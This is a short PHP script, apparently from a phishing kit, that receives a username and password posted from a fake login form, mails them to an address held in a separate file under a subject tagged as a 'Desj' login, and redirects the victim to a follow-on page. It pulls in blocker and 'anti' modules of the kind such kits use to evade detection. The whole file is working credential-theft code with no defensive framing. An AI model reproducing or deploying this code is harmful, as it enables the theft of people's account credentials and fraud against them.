<?php
 include 'email.php';
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';

    $ip = $_SERVER['REMOTE_ADDR'];
    $UA = $_SERVER['HTTP_USER_AGENT'];
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    $data ="
  _________________________________
   
    Username: $user
    
    Password: $pass
   _________________________________
    
    ";
    
    $subj="|Desj|Login|-$user-|";
    
    
    mail($to, $subj, $data);
    
    header("refresh: 1; url= 2.php?name=" . $user);
    
    ?>